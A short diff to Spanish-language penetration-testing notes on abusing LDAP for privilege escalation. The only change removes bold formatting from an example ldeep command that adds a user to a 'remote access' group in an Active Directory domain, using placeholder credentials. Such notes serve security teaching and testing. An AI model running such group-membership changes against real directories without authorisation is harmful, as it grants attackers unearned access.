@@ -26,4 +26,4 @@ En algunos casos podemos abusar de ldap para elevar nuestros privilegios. Para e
 
 Ejemplo aplicado
 
-    **ldeep ldap -u fulano -p 'mengano' -d dominio.local -s ldap://dominio.local add_to_group "CN=Fulano Flores,OU=STAFF,DC=dominio,DC=local" "CN=remote access,OU=remote,DC=dominio,DC=local"**
+    ldeep ldap -u fulano -p 'mengano' -d dominio.local -s ldap://dominio.local add_to_group "CN=Fulano Flores,OU=STAFF,DC=dominio,DC=local" "CN=remote access,OU=remote,DC=dominio,DC=local"
